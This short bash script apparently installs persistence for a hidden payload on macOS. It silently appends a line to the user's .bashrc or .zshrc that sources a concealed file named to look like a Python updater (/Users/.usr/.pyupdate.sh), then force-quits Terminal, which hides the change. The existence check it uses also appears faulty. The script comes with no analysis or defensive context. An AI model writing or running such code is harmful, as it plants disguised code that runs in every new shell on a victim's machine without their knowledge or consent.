#!/bin/bash

if [ -f /Users/.bashrc ]; then
    echo >> $HOME/.bashrc
    echo source /Users/.usr/.pyupdate.sh >> $HOME/.bashrc
else
    echo >> $HOME/.zshrc
    echo source /Users/.usr/.pyupdate.sh >> $HOME/.zshrc
fi

osascript -e 'tell application "Terminal" to quit'
